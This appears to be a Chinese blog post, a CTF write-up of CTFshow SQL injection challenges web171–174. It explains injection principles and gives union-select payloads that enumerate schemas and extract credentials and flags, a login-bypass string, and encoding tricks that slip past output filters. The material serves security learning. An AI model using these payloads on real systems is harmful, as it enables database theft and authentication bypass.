@@ -1,0 +1,162 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Hsad"><meta name="copyright" content="Hsad"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>EZsql | Hsad's Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"hsad.xyz","root":"/","title":"所以你弃权","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="前言SQL注入原理1.SQL注入概念及产生原因：当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 2.SQL注入的本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 3.SQL注入的两个关键点：1.用户能控制输入的内容；  2.web应用把">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EZsql">
+<meta property="og:url" content="https://hsad.xyz/2024/07/05/EZsql/index.html">
+<meta property="og:site_name" content="Hsad&#39;s Blog">
+<meta property="og:description" content="前言SQL注入原理1.SQL注入概念及产生原因：当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊 的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。 2.SQL注入的本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 3.SQL注入的两个关键点：1.用户能控制输入的内容；  2.web应用把">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-07-05T07:50:17.000Z">
+<meta property="article:modified_time" content="2024-07-05T11:17:35.021Z">
+<meta property="article:author" content="Hsad">
+<meta property="article:tag" content="CTFshow">
+<meta property="article:tag" content="Sql注入">
+<meta name="twitter:card" content="summary"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Hsad"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Hsad"><span class="site-author-status" title="凉">☺️</span></a><div class="site-author-name"><a href="/about/">Hsad</a></div><span class="site-name">Hsad's Blog</span><sub class="site-subtitle">一个人的世界</sub><div class="site-description">翻着我们的照片 想念若隐若现</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">3</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">9</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=EYiK7-b5ur1mWxbX7aV2AEBsuoW9c732" title="QQ" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:qq-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/watanabe-hsad" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:dubian.zzy@outlook.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E5%BF%B5%E5%8F%8A%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.SQL注入概念及产生原因：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9C%AC%E8%B4%A8%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.SQL注入的本质：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%85%B3%E9%94%AE%E7%82%B9%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.SQL注入的两个关键点：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%8D%B1%E5%AE%B3%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">SQL注入基础危害：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">MYSQL数据库注入-常用函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%EF%BC%88%E8%81%94%E5%90%88%EF%BC%89%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">SQL（联合）注入流程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E2%80%93%E6%99%AE%E9%80%9ASQL%E6%B3%A8%E5%85%A5%E5%BF%85%E5%A4%87%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">总结–普通SQL注入必备条件：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web171-253"><span class="toc-number">2.</span> <span class="toc-text">web171-253</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web171-%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="toc-number">2.1.</span> <span class="toc-text">web171(单引号闭合)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web172"><span class="toc-number">2.2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web173-%E5%9B%9E%E6%98%BE%E6%A3%80%E6%B5%8B"><span class="toc-number">2.3.</span> <span class="toc-text">web173(回显检测)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web174"><span class="toc-number">2.4.</span> <span class="toc-text">web174</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://hsad.xyz/2024/07/05/EZsql/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Hsad"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hsad's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">EZsql</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-07-05 15:50:17" itemprop="dateCreated datePublished" datetime="2024-07-05T15:50:17+08:00">2024-07-05</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">安全相关</span></a></span> > <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTFshow/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTFshow</span></a><a class="tag-item" href="/tags/Sql%E6%B3%A8%E5%85%A5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Sql注入</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h4><h5 id="1-SQL注入概念及产生原因："><a href="#1-SQL注入概念及产生原因：" class="headerlink" title="1.SQL注入概念及产生原因："></a>1.SQL注入概念及产生原因：</h5><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊</p>
+<p>的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+<h5 id="2-SQL注入的本质："><a href="#2-SQL注入的本质：" class="headerlink" title="2.SQL注入的本质："></a>2.SQL注入的本质：</h5><p>把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</p>
+<h5 id="3-SQL注入的两个关键点："><a href="#3-SQL注入的两个关键点：" class="headerlink" title="3.SQL注入的两个关键点："></a>3.SQL注入的两个关键点：</h5><p>1.用户能控制输入的内容； </p>
+<p>2.web应用把用户输入的内容带入到数据库执行；</p>
+<h5 id="SQL注入基础危害："><a href="#SQL注入基础危害：" class="headerlink" title="SQL注入基础危害："></a>SQL注入基础危害：</h5><p>1.盗取网站的敏感信息;</p>
+<p>2.绕过网站后台认证 后台登录语句： </p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM admin WHERE Username&#x3D;‘user’ and Password&#x3D;‘pass’ 万能密码：‘or ’1‘ &#x3D; ’1‘ # ;</code></pre>
+
+<p>3.借助SQL注入漏洞提权获取系统权限;</p>
+<p>4.读取文件信息。</p>
+<h4 id="MYSQL数据库注入-常用函数："><a href="#MYSQL数据库注入-常用函数：" class="headerlink" title="MYSQL数据库注入-常用函数："></a>MYSQL数据库注入-常用函数：</h4><p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </p>
+<p>（2）version() 返回当前数据库的版本 </p>
+<p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </p>
+<p>（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p>
+<p>（5）@@datadir 数据库路径 </p>
+<p>（6）@@version_compile_os 操作系统版本</p>
+<h4 id="SQL（联合）注入流程："><a href="#SQL（联合）注入流程：" class="headerlink" title="SQL（联合）注入流程："></a>SQL（联合）注入流程：</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and 1&#x3D;1</code></pre>
+
+<p>1、判断有无闭合 </p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 --+闭合</code></pre>
+
+<p>2、猜解字段</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">order by 10 &#x2F;&#x2F;采用二分法 </code></pre>
+
+<p>3、判断数据回显位置 </p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1 union select 1，2，3，4，5.... &#x2F;&#x2F;参数等号后面加-表示不显示当前数据 </code></pre>
+
+<p>4、获取当前数据库名、用户、版本 union select version(),database()，user()，4…… 4、获取全部数据库名</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(schema_name)from information_schema.schemata)</code></pre>
+
+
+<p>5、获取表名</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;库名&#39;</code></pre>
+
+<p>6、获取字段名</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;表名&#39;</code></pre>
+
+<p>7、获取数据</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(字段1，字段2)from 库名.表名</code></pre>
+
+<p>函数名称： 函数功能：</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">查 库： select schema_name from information_schema.schema
+查 表： select table_name from information_schema.tables where table_schema&#x3D;库名
+查 列： select column_name from information_schema.columns where table_name&#x3D;表名
+查数据： select 列名 from 库名.表名</code></pre>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fly_enum/article/details/135307756">SQL注入原理及思路绕过</a></p>
+</blockquote>
+<h4 id="总结–普通SQL注入必备条件："><a href="#总结–普通SQL注入必备条件：" class="headerlink" title="总结–普通SQL注入必备条件："></a>总结–普通SQL注入必备条件：</h4><p>1、界面能够回显数据库查询到的数据（必要条件）；</p>
+<p>2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；</p>
+<p>3、部分能够直接提供数据库报错内容的回显；</p>
+<h3 id="web171-253"><a href="#web171-253" class="headerlink" title="web171-253"></a>web171-253</h3><h4 id="web171-单引号闭合"><a href="#web171-单引号闭合" class="headerlink" title="web171(单引号闭合)"></a>web171(单引号闭合)</h4><p>查询语句</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;拼接sql语句查找指定ID用户
+$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre>
+
+<p>根据流程拿到库 表 列名，最后拿到flag</p>
+<p>第一题所以流程详细一点</p>
+<p>首先尝试1’–+，发现有返回值；说明直接闭合正确；</p>
+<p>接着找用来输出的列：<code>1&#39; order by 3--+</code>，发现一共有3行(就1,2,3,4,5慢慢试出来)</p>
+<p>查看数据库：<code>1&#39; union select 1,2,database()--+</code>得到数据库名为<code>ctfshow_web</code></p>
+<p>爆破表名：<code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schecma=database()--+</code>得到表名：<code>ctfshow_user</code></p>
+<p>爆破列名：<code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code>，得到列名：<code>id,username,password</code></p>
+<p>爆破信息：<code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code>，拿到flag。</p>
+<p>整理一下：</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆出有哪些位置可以进行输出数据
+1&#39; order by 3--+
+查看数据库名字
+1&#39; union select 1,2,database()--+
+爆破表名：
+-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+
+爆破列名：
+1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;--+
+爆破数据：
+1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></pre>
+
+<p>有一个问题就是，这里用的是1而不是-1，居然能够爆出信息。可能是这里没有限定输出数据的量，所以能够用1，而不是用-1。</p>
+<h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>跟上一题差不多，只不过这里把flag换到另一个表<code>ctfshow_user2</code>里了，而且字段数改为2了</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">爆破表名
+-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+
+爆破列名
+-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user2&#39;--+
+爆破flag
+-1&#39; union select 1,2,group_concat(password) FROM ctfshow_user2 where username&#x3D;&#39;flag&#39;--+</code></pre>
+
+<h4 id="web173-回显检测"><a href="#web173-回显检测" class="headerlink" title="web173(回显检测)"></a>web173(回显检测)</h4><p>返回逻辑多了限制，回显不能有flag，但是直接查flag回显是ctfshow</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span></code></pre>
+
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select 1,2,password from ctfshow_user3 where username &#x3D; &#39;flag&#39; --+
+1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+</code></pre>
+
+<p>或者使用其他绕过姿势  <strong>编码绕过,base64，hex</strong></p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username&#x3D;&#39;flag&#39;--+
+-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></pre>
+
+<h4 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|[0-9]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+   </code></pre>
+
+<p>限制了数字和<code>flag</code></p>
+<p>替换：将数据to_base64加密，然后将里面所有的数字用replace()替换</p>
+<p>替换方式：<code>1 @A</code>,<code>2 @B</code> <code>3 @C</code>等等</p>
+<pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username &#x3D; &#39;flag&#39; --+</code></pre>
+
+<p>然后使用脚本解密得到flag</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+ 
+flag64 <span class="token operator">=</span> <span class="token string">" "</span>
+ 
+flag <span class="token operator">=</span> flag64<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@A"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@B"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@C"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@D"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@E"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@F"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@G"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@H"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@I"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"@J"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+ 
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Hsad</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://hsad.xyz/2024/07/05/EZsql/" title="EZsql">https://hsad.xyz/2024/07/05/EZsql/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/07/02/EZupload/" rel="next" title="EZupload"><span class="post-nav-text">EZupload</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Hsad</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
